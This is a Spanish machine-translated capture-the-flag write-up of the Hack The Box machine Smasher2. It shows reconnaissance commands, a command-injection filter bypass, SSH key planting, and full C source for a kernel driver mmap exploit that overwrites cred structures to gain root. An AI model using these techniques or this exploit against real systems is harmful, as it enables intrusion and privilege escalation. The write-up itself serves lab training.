<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëäüèº üêú üë©‚Äçüè´ Hack The Box - Tutorial de Smasher2 Frasco, WAF y LPE a trav√©s de controladores pwn üõÑ üò≤ üë©üèΩ‚Äçüíº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="En este art√≠culo, comenzar√© a publicar soluciones enviadas para su posterior procesamiento desde el sitio HackTheBox . Espero que esto ayude al menos ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hack The Box - Tutorial de Smasher2 Frasco, WAF y LPE a trav√©s de controladores pwn</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/480454/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/ms/yw/0j/msyw0jxgua25iuntaxj1qcayfuq.png" alt="imagen"></div><br>  En este art√≠culo, comenzar√© a publicar soluciones enviadas para su <a href="https://www.hackthebox.eu/" rel="nofollow">posterior procesamiento</a> desde el sitio <a href="https://www.hackthebox.eu/" rel="nofollow">HackTheBox</a> .  Espero que esto ayude al menos a alguien a desarrollarse en el campo de la seguridad de la informaci√≥n.  En este art√≠culo, revertiremos la biblioteca para python, omitiremos WAF y aprovecharemos la vulnerabilidad de mmap. <br><br>  La conexi√≥n al laboratorio es a trav√©s de VPN.  Se recomienda no conectarse desde una computadora de trabajo o desde un host donde los datos importantes para usted est√©n disponibles, ya que termina en una red privada con personas que saben algo en el campo de la seguridad de la informaci√≥n :) <br><br><div class="spoiler">  <b class="spoiler_title">Informaci√≥n organizacional</b> <div class="spoiler_text">  Especialmente para aquellos que quieran aprender algo nuevo y desarrollarse en cualquiera de las √°reas de informaci√≥n y seguridad inform√°tica, escribir√© y hablar√© sobre las siguientes categor√≠as: <br><br><ul><li>  PWN; </li><li>  criptograf√≠a (criptograf√≠a); </li><li>  tecnolog√≠as de red (Red); </li><li>  inversa (ingenier√≠a inversa); </li><li>  esteganograf√≠a (Stegano); </li><li>  b√∫squeda y explotaci√≥n de vulnerabilidades WEB. </li></ul><br>  Adem√°s de esto, compartir√© mi experiencia en inform√°tica forense, an√°lisis de malware y firmware, ataques a redes inal√°mbricas y redes de √°rea local, realizaci√≥n de pentests y escritura de exploits. <br><a name="habracut"></a><br>  Para que pueda conocer nuevos art√≠culos, software y otra informaci√≥n, cre√© un <a href="https://t.me/RalfHackerChannel" rel="nofollow">canal en Telegram</a> y un <a href="https://t.me/RalfHackerPublicChat" rel="nofollow">grupo para discutir cualquier problema</a> en el campo de ICD.  Adem√°s, considerar√© personalmente sus solicitudes personales, preguntas, sugerencias y recomendaciones <a href="https://t.me/hackerralf8" rel="nofollow">personalmente y responder√© a todos</a> . <br><br>  Toda la informaci√≥n se proporciona solo con fines educativos.  El autor de este documento no tiene ninguna responsabilidad por los da√±os causados ‚Äã‚Äãa alguien como resultado del uso del conocimiento y los m√©todos obtenidos como resultado de estudiar este documento. <br></div></div><br><h2>  Inteligencia </h2><br><h3>  Escaneo de puertos </h3><br>  Esta m√°quina tiene una direcci√≥n IP de 10.10.10.135, que agrego a / etc / hosts. <br> <code>10.10.10.135 smasher2.htb</code> <br>  Primero, escaneamos puertos abiertos.  Como lleva mucho tiempo escanear todos los puertos con nmap, primero har√© esto con masscan.  Escaneamos todos los puertos TCP y UDP desde la interfaz tun0 a una velocidad de 1000 paquetes por segundo. <br><br><pre> <code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.135 --rate=1000</code> </pre> <br><img src="https://habrastorage.org/webt/ua/l0/kl/ual0klllexxrrkhyehygavfrji8.png" alt="imagen"><br><br>  El host tiene 3 puertos abiertos.  Ahora escanee con nmap para obtener m√°s detalles. <br><br><pre> <code class="bash hljs">nmap -A 10.10.10.135 -p22,53,80</code> </pre> <br><img src="https://habrastorage.org/webt/rv/21/y3/rv21y3ntl_dol3qnlgvdhvshdhg.png" alt="imagen"><br><br>  Por lo tanto, tenemos SSH, DNS y WEB, que devuelve el c√≥digo 403 (Prohibido, acceso denegado). <br><br><h3>  DNS </h3><br>  Verifiquemos el DNS.  Para hacer esto, use el cliente host, con la opci√≥n -l, para usar la solicitud AXFR para ver una lista de todos los hosts en el dominio. <br><br><pre> <code class="bash hljs">host -l smasher2.htb 10.10.10.135</code> </pre> <br><img src="https://habrastorage.org/webt/3q/st/te/3qstteuzgycf6fxuc_7vxit1rfe.png" alt="imagen"><br><br>  Por lo tanto, debe agregar una nueva entrada en / etc / hosts. <br> <code>10.10.10.135 wonderfulsessionmanager.smasher2.htb</code> <br> <br><h3>  WEB </h3><br>  Ahora pasemos a ver qu√© WEB nos dar√° al acceder a smasher2.htb. <br><br><img src="https://habrastorage.org/webt/9-/li/n5/9-lin58jouqm966oevnsoccso1a.png" alt="imagen"><br><br>  Esta vacio  En este caso, debe ordenar los directorios.  Estoy usando golang escrito r√°pido gobuster.  Clasificaremos los directorios en 128 hilos, nos interesar√°n las extensiones html, php, txt, conf y los c√≥digos de respuesta 200, 204, 301, 302, 307, 401. <br><br><pre> <code class="bash hljs">gobuster dir -t 128 -u http://smasher2.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,conf -s 200,204,301,302,307,401</code> </pre><br><img src="https://habrastorage.org/webt/iw/du/g9/iwdug9gy9ukr37s9nn4-c7pqojk.png" alt="imagen"><br><br>  Encuentra el directorio de respaldo.  Nos fijamos en lo que hay en √©l. <br><br><img src="https://habrastorage.org/webt/id/lj/zz/idljzzfub_qbnzzwu2x1lic2l38.png" alt="imagen"><br><br>  Como resultado, descargue el archivo y la biblioteca de Python.  Luego, vaya a otro nombre de dominio, y all√≠ encontraremos el formulario de autorizaci√≥n. <br><br><img src="https://habrastorage.org/webt/mu/n0/mp/mun0mpgaqduxfzmhxifnqbq6_gg.png" alt="imagen"><br><br>  El complemento Mozilla Firefox Wappalyzer informa qu√© tecnolog√≠as se est√°n utilizando.  Por lo tanto, el sitio est√° escrito en python 2.7.15. <br><br><img src="https://habrastorage.org/webt/ze/h9/ze/zeh9zeby2o839yeim2osz0-w__i.png" alt="imagen"><br><br><h2>  API WEB </h2><br><h3>  Pit√≥n </h3><br>  Acabamos de encontrar el archivo auth.py, analic√©moslo.  En la primera l√≠nea de la importaci√≥n, pasamos al m√≥dulo ses.so, que tambi√©n encontramos en las copias de seguridad. <br><br><img src="https://habrastorage.org/webt/8-/ap/rm/8-aprmznzxtkkd04fzy9wzzrchk.png" alt="imagen"><br><br>  Encontramos autenticaci√≥n en el c√≥digo.  En caso de autenticaci√≥n exitosa, seremos devueltos secret_token_info. <br><br><img src="https://habrastorage.org/webt/vn/er/sa/vnersai2zkkcopwujarn-9abz8i.png" alt="imagen"><br><br><img src="https://habrastorage.org/webt/j2/yp/3e/j2yp3emp8fwuj4xbshedsf7bou0.png" alt="imagen"><br><br>  Vayamos al punto "/ api // trabajo".  Los datos se reciben por el m√©todo POST, mientras que deben estar en formato JSON.  Si el par√°metro de programaci√≥n est√° presente en los datos, se pasa a la ejecuci√≥n como un comando en la l√≠nea de comandos. <br><br><img src="https://habrastorage.org/webt/x7/oh/fs/x7ohfsjrcxhr8-tuwqdtcsnjxq8.png" alt="imagen"><br><br>  El nombre de usuario y la contrase√±a se han editado ... Se transfieren a nuestra biblioteca, que crea una sesi√≥n: el objeto SessionManager. <br><br><img src="https://habrastorage.org/webt/uq/p4/2e/uqp42eqln2alvsfnpwyvjbe5c_q.png" alt="imagen"><br><br>  La funci√≥n safe_init_manager (id) se llamar√° en cada nueva llamada, debido a before_request.  Por lo tanto, se inicia una nueva sesi√≥n. <br><br><img src="https://habrastorage.org/webt/95/wv/yu/95wvyudl1crmjq5nv-bq-li7gze.png" alt="imagen"><br><br>  La funci√≥n login () crea un objeto administrador dependiente de la sesi√≥n. <br><br><img src="https://habrastorage.org/webt/zi/0t/uh/zi0tuhqdy8ewibq3purmsr6u5_e.png" alt="imagen"><br><br>  Y la verificaci√≥n se lleva a cabo mediante el m√©todo check_login (). <br><br><img src="https://habrastorage.org/webt/u8/xt/_v/u8xt_vgcczwhkl4cbqlzov7tsio.png" alt="imagen"><br><br><h3>  Invertir .so </h3><br>  Entonces, necesitamos averiguar c√≥mo se verifican los datos.  Para hacer esto, en la biblioteca necesitamos comprender el dispositivo SessionManager.check_login ().  Agregue IDA Pro, busque la funci√≥n deseada. <br><br><img src="https://habrastorage.org/webt/ui/--/y0/ui--y0og5qsjhymyhpozz6kux0u.png" alt="imagen"><br><br>  Al abrir la funci√≥n, llam√© la atenci√≥n sobre su gr√°fico.  Estaba interesado en varios bloques inferiores antes de converger. <br><br><img src="https://habrastorage.org/webt/89/1o/7r/891o7r5jjpip6zh2uqba7xzbgrs.png" alt="imagen"><br><br>  Mirando a trav√©s de los bloques, puede ver de qu√© est√° hablando esta o aquella rama de la ejecuci√≥n de la funci√≥n.  Por lo tanto, solo necesitamos el bloque m√°s a la derecha. <br><br><img src="https://habrastorage.org/webt/ve/xq/da/vexqdaz61fubdsfteffkqdx0ngi.png" alt="imagen"><br><br>  He pintado la l√≠nea de comportamiento de la funci√≥n que nos interesa. <br><br><img src="https://habrastorage.org/webt/9c/k9/ao/9ck9aomluu0wemswvub1salylas.png" alt="imagen"><br><br>  Ahora vamos a ver qu√© pasa.  En un lugar, not√© un c√≥digo id√©ntico para inicio de sesi√≥n y contrase√±a.  Y tambi√©n la misma comparaci√≥n. <br><br><img src="https://habrastorage.org/webt/65/fs/cd/65fscdprft3krxphyiwtbxdq_vg.png" alt="imagen"><br><br>  Adem√°s, se llama a la misma funci√≥n para el inicio de sesi√≥n y la contrase√±a. <br><br><img src="https://habrastorage.org/webt/jo/um/w3/joumw3woscffqrof2lnjlyajdqs.png" alt="imagen"><br><br>  Esto sugiere que el nombre de usuario y la contrase√±a son los mismos.  Pero dado que este valor llega al programa python y se ha editado, solo queda clasificarlo.  Prob√© el nombre est√°ndar y, para mi sorpresa, apareci√≥ el Administrador (por qu√© no lo intent√© de inmediato ...). <br><br><img src="https://habrastorage.org/webt/xp/9n/at/xp9natep2ikm8wlduicpijksqug.png" alt="imagen"><br><br><h2>  Punto de entrada </h2><br>  Tenemos una llave  Ahora necesita recopilar la solicitud para ejecutar el c√≥digo.  Como se mencion√≥ anteriormente, debemos enviar los datos del m√©todo POST que contienen el par√°metro de programaci√≥n en formato JSON a <a href="http://wonderfulsessionmanager.smasher2.htb/auth/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job" rel="nofollow">wonderfulsessionmanager.smasher2.htb / auth / fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8 / job</a> .  Hacemos esto con curl y pasamos el resultado a jq.  Ejecutaremos el comando whoami. <br><br><pre> <code class="bash hljs">curl -s -H <span class="hljs-string"><span class="hljs-string">"Cookie: session=eyJpZCI6eyIgYiI6Ik5UaGlZVEJrTmpBMk1qYzBNemN4TmprellUTm1NREV3TXprMk9USTRPV1UzTnpVd05EQXdZZz09In19.XfZcLA.R3UTUnieAARkHBTbqpTmofKWtBw"</span></span> -H <span class="hljs-string"><span class="hljs-string">"Content-Type: application/json"</span></span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="hljs-string"><span class="hljs-string">'{"schedule":"whoami"}'</span></span> | jq</code> </pre> <br><img src="https://habrastorage.org/webt/-s/u0/er/-su0erve1bo3frizq-_qmtlyclq.png" alt="imagen"><br><br>  Pero cuando intentamos ejecutar el comando "ls", obtenemos un error. <br><br><img src="https://habrastorage.org/webt/sz/c7/pk/szc7pkucef1xd5errhnrw01ydas.png" alt="imagen"><br><br>  Lo m√°s probable es que haya un filtro en el equipo.  Enviemos "l \\ s" - con √©xito, lo que indica la presencia de un filtro. <br><br><img src="https://habrastorage.org/webt/bx/vl/wy/bxvlwyxbspsgt_bsucpjk8gkdda.png" alt="imagen"><br><br><h2>  Usuario </h2><br>  Ahora necesitamos obtener un shell normal en el sistema.  El sistema ejecuta SSH, por lo que podemos generar una clave e insertarla en la lista de hosts autorizados. <br><br>  Primero generamos una clave. <br><br><img src="https://habrastorage.org/webt/75/nx/-m/75nx-mr9ckmrkoyiwer3tte6qbm.png" alt="imagen"><br><br>  Ahora necesitamos transferir nuestra clave p√∫blica al archivo /home/dzonerzy/.ssh/authorized_keys.  Pero para facilitar la transferencia, utilizaremos su codificaci√≥n en base64. <br><br><pre> <code class="bash hljs">base64 -w0 id_rsa.pub</code> </pre> <br>  Primero lo transferimos a un archivo temporal. <br><br><pre> <code class="bash hljs">ec\\ho \‚Äù=\‚Äù &gt; /tmp/ralf</code> </pre> <br>  Ahora decodifique y escriba seg√∫n lo previsto. <br><pre> <code class="bash hljs">ba\\se\\64 -\\d /tmp/ralf &gt;&gt; /home/dzonerzy/\\.\\ss\\h/auth\\orized_ke\\ys</code> </pre> <br>  Anotamos la clave, ahora si todo est√° bien, podemos conectarnos a trav√©s de SSH utilizando la clave privada.  Lo intentamos  Y estamos en el sistema. <br><br><img src="https://habrastorage.org/webt/mf/7t/7n/mf7t7nnau3dbshpiirvblygdrhk.png" alt="imagen"><br><br><h2>  LPE - RA√çZ </h2><br><h3>  Listado </h3><br>  Junto al token del usuario se encuentra el archivo README.  L√©elo <br><br><img src="https://habrastorage.org/webt/n0/io/bi/n0iobindnitc1h69lhemnrnskmw.png" alt="imagen"><br><br>  Se nos dice que no debemos pensar de manera est√°ndar ... Pero despu√©s de completar las enumeraciones est√°ndar y no encontrar nada, llam√© la atenci√≥n sobre el grupo en el que se encuentra el usuario. <br><br><img src="https://habrastorage.org/webt/ko/rc/9u/korc9u_5ji78nds_jgcnelql_uq.png" alt="imagen"><br><br>  El grupo adm tiene acceso a archivos interesantes. <br><br><img src="https://habrastorage.org/webt/dp/oj/c0/dpojc0lhn1tpdzsgcp0k11vtyec.png" alt="imagen"><br><br>  Por ejemplo, auth.log.  Refleja no solo los hechos de una autorizaci√≥n exitosa y no exitosa, sino tambi√©n los hechos del uso del comando sudo. <br><br><pre> <code class="bash hljs">strings /var/<span class="hljs-built_in"><span class="hljs-built_in">log</span></span>/auth.log | grep sudo</code> </pre> <br><img src="https://habrastorage.org/webt/8t/a6/r7/8ta6r7a-rgji8-ruimkshuc-2to.png" alt="imagen"><br><br>  Se ejecuta un comando interesante en nombre de la ra√≠z.  Pero est√° conectado con el controlador, por lo que debe asegurarse de seguir el camino. <br><br><img src="https://habrastorage.org/webt/ix/1i/gx/ix1igxiggwoaugz01xkwu81ftbe.png" alt="imagen"><br><br>  S√≠, desafortunadamente, todo va al conductor. <br><br><h3>  Conductor </h3><br>  Como se trata de un controlador (m√≥dulo del n√∫cleo), obtendremos informaci√≥n al respecto mediante modinfo. <br><br><img src="https://habrastorage.org/webt/ek/bh/1v/ekbh1vr8tpqrjysaqtkuu3ogwsk.png" alt="imagen"><br><br>  Se dice que el controlador es necesario para trabajar con el dispositivo dhid.  Compru√©balo <br><br><img src="https://habrastorage.org/webt/ck/bv/zx/ckbvzxss6iz1ughsn_lhqflutw4.png" alt="imagen"><br><br>  Si  Existe tal dispositivo.  Para estudiar el controlador, lo copi√© yo mismo y lo descargu√© en IDA Pro. <br><br><pre> <code class="bash hljs">scp -i id_rsa dzonerzy@10.10.10.135:/lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko ./</code> </pre> <br>  Una escasa lista de funciones, de las cuales para PWN estamos interesados ‚Äã‚Äãen aquellas que funcionan con memoria.  A juzgar por los nombres, estos son dev_read y dev_mmap. <br><br><img src="https://habrastorage.org/webt/g9/k9/5s/g9k95slhxhlihqi0nhwm3ei5qxk.png" alt="imagen"><br><br>  Despu√©s de buscar en Google, no encontr√© particularmente informaci√≥n sobre la vulnerabilidad en los controladores relacionados con la lectura, ¬°lo que no se puede decir sobre mmap!  Entonces fui a ella. <br><br><img src="https://habrastorage.org/webt/3v/rk/7x/3vrk7xh2hcwclirw59wcdzihxxe.png" alt="imagen"><br><br>  En general, mmap en los controladores es necesario para asignar el dispositivo a la memoria y seleccionar p√°ginas a pedido, ya que inicialmente el dispositivo no usa memoria f√≠sica en absoluto. <br><br>  En este c√≥digo, el √∫nico lugar interesante es la llamada a la funci√≥n remap_pfn_range, que permite la asignaci√≥n lineal de la memoria del dispositivo al espacio de direcciones del usuario. <br><blockquote>  int remap_pfn_range (struct vm_area_struct * vma, unsigned long virt_add, unsigned long pfn, unsigned long size, pgprot_t prot); <br><br>  Muestra el tama√±o de bytes de las direcciones f√≠sicas, comenzando con el n√∫mero de p√°gina especificado por pfn para la direcci√≥n virtual virt_add.  Los bits de seguridad asociados con el espacio virtual se especifican en prot. </blockquote><br>  Como de costumbre, observamos los par√°metros que no se procesaron previamente.  Estos son los par√°metros pfn y size, que nos permiten mostrar cualquier cantidad de memoria para leer y escribir. <br><br><h3>  Explotar </h3><br>  Buscando en Google lo que se puede hacer al respecto, me llam√≥ la atenci√≥n una posible forma de explotaci√≥n.  Si podemos encontrar la estructura de control de creds en la memoria, esto nos permitir√° cambiar el usuario uid a 0. Y luego llamar al shell, lo que nos dar√° un shell con todos los privilegios. <br><br><img src="https://habrastorage.org/webt/of/os/r5/ofosr5umezutxzuvasy8xd-_cqg.png" alt="imagen"><br><br>  Primero, verifique si podemos mostrar una gran cantidad de memoria.  El siguiente c√≥digo abrir√° el dispositivo y mostrar√° 0xf0000000 bytes a partir de la direcci√≥n 0x40404040 para leer y escribir con la posibilidad de usar esta reflexi√≥n con otros procesos que reflejan el mismo objeto. <br><br><div class="spoiler">  <b class="spoiler_title">codigo</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br>  Compile: <code>gcc sh.c -o sh.bin</code> y transfi√©ralo al host.  Vamos a ejecutarlo. <br><br><img src="https://habrastorage.org/webt/vh/d2/u3/vhd2u3vjza59bcxi69drrpwoc9a.png" alt="imagen"><br><br>  Ahora vamos a otro terminal ssh y miremos la tarjeta de memoria de este proceso. <br><br><img src="https://habrastorage.org/webt/6u/mp/v4/6umpv4dzghjv0y1u2lyyy6lad7g.png" alt="imagen"><br><br>  Como puede ver, la direcci√≥n es la misma, se colocan etiquetas para leer y escribir, as√≠ como para compartir.  Esa es una idea de trabajo.  El siguiente paso es encontrar la estructura de credibilidad del proceso en mente.  Se puede ver en la estructura anterior que el sello distintivo ser√° 8 n√∫meros heridos por nuestro uid, yendo en una fila. <br><br><div class="spoiler">  <b class="spoiler_title">codigo</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, cred_iter: %d\n", addr, cred_iter); } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br>  As√≠ encontramos 19 estructuras similares. <br><br><img src="https://habrastorage.org/webt/rj/j5/pl/rjj5plsfirobcfwqzc8vss-svtc.png" alt="imagen"><br><br>  Ahora necesitamos reescribir todos los uid a 0. Despu√©s de reescribir los uid de una determinada estructura, verificaremos nuestro uid.  Tan pronto como nuestro uid sea igual a 0, podemos suponer que hemos encontrado la estructura del proceso que necesitamos. <br><br><div class="spoiler">  <b class="spoiler_title">codigo</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; if (getuid() == 0){ printf("found current struct... ptr: %p, crednum: %d\n", addr, cred_iter); break; } else{ cred_cur = 0; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; } } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/1x/62/eq/1x62eqetpojbwrrimgaguepynb4.png" alt="imagen"><br><br>  Ahora, despu√©s de encontrar la estructura que necesitamos, cambiaremos el uid a 0xffffffff y llamaremos al shell bash a trav√©s de la funci√≥n exec. <br><br><div class="spoiler">  <b class="spoiler_title">codigo</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;sys/mman.h&gt; int main(int argc, char * const * argv){ printf("pid: %d\n", getpid()); int fd = open("/dev/dhid", O_RDWR); printf("fd: %d\n", fd); unsigned long size = 0xf0000000; unsigned long start_mmap = 0x40404000; unsigned int * addr = (unsigned int *)mmap((void*)start_mmap, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0); printf("mmap address: %lx\n", addr); unsigned int uid = getuid(); unsigned int cred_cur = 0; unsigned int cred_iter = 0; while (((unsigned long)addr) &lt; (start_mmap + size - 0x40)){ cred_cur = 0; if( addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid &amp;&amp; addr[cred_cur++] == uid ){ cred_iter++; printf("found struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; addr[cred_cur++] = 0; if (getuid() == 0){ printf("found current struct... ptr: %p, crednum: %d\n", addr, cred_iter); cred_cur += 1; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; addr[cred_cur++] = 0xffffffff; execl("/bin/sh","-", (char *)NULL); break; } else{ cred_cur = 0; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; addr[cred_cur++] = uid; } } addr++; } fflush(stdout); int stop = getchar(); return 0; }</span></span></span></span></code> </pre> <br></div></div><br><img src="https://habrastorage.org/webt/mn/zl/xq/mnzlxqz8pj4qafv_w0jznrhb0_e.png" alt="imagen"><br><br>  Tenemos root  De hecho, esta es una m√°quina muy compleja que requiri√≥ sofisticaci√≥n para manejar esta versi√≥n de LPE. <br><br>  Por supuesto, fue muy dif√≠cil explotar la vulnerabilidad en el controlador, y estoy agradecido a la comunidad que me ayud√≥ con una pista sobre c√≥mo llegar al controlador y comparti√≥ un art√≠culo sobre la explotaci√≥n similar de la vulnerabilidad en mmap. <br><br>  ¬øDebo continuar publicando el an√°lisis de las m√°quinas enviadas para su posterior procesamiento?  Puedes unirte a nosotros en <a href="https://t.me/RalfHackerChannel" rel="nofollow">Telegram</a> .  Formemos una comunidad en la que haya personas con conocimientos en muchas √°reas de TI, para que siempre podamos ayudarnos mutuamente en cualquier problema de seguridad de la informaci√≥n y TI. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/480454/">https://habr.com/ru/post/480454/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../480432/index.html">El problema del primer espectador, o la dif√≠cil conversi√≥n de las transmisiones de video WebRTC a HLS</a></li>
<li><a href="../480438/index.html">Eventos digitales en Mosc√∫ del 16 al 22 de diciembre.</a></li>
<li><a href="../480440/index.html">Eventos digitales en San Petersburgo del 16 al 22 de diciembre.</a></li>
<li><a href="../480444/index.html">Detective Habra: 24 horas desde la vida de 24 publicaciones</a></li>
<li><a href="../480452/index.html">OWASP Moscow Meetup # 9: Registros de rendimiento</a></li>
<li><a href="../480458/index.html">Mira "C√©lula del tiempo"</a></li>
<li><a href="../480462/index.html">C√≥mo debat√≠ una lista doblemente vinculada para O (1)</a></li>
<li><a href="../480466/index.html">Especificaciones del dializador: el camino del Jedi</a></li>
